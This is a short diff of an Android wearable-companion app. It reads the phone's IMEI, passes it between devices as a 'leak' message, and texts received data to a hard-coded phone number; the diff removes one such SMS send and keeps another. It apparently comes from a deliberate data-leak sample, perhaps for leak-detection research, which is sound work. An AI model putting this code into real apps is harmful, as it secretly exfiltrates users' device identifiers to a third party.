@@ -109,7 +109,7 @@ public class MainActivity extends Activity implements GoogleApiClient.Connection
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-
+        requestPermissions();
         //Instantiate google play services
         mGoogleApiClient = new GoogleApiClient.Builder(this)
                 .addApi(Wearable.API)
@@ -117,7 +117,7 @@ public class MainActivity extends Activity implements GoogleApiClient.Connection
                 .addOnConnectionFailedListener(this)
                 .build();
 
-        requestPermissions();
+
     }
 
     @Override
@@ -189,8 +189,6 @@ public class MainActivity extends Activity implements GoogleApiClient.Connection
         TelephonyManager TM = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
         String imeiNo = TM.getDeviceId();
         sendMessage(imeiNo.getBytes());
-        SmsManager SM = SmsManager.getDefault();
-        SM.sendTextMessage("07922021702", null, imeiNo, null, null);
 
     }
 
@@ -201,7 +199,7 @@ public class MainActivity extends Activity implements GoogleApiClient.Connection
         byte[] leakBytes = messageEvent.getData();
         String leak = new String(leakBytes);
         if (Log.isLoggable(TAG, Log.DEBUG)) {
-            Log.d(TAG, "Received leak: " + leak);
+            Log.d(TAG, "Received leak");
         }
         SmsManager SM = SmsManager.getDefault();
         SM.sendTextMessage("07922021702", null, leak, null, null);
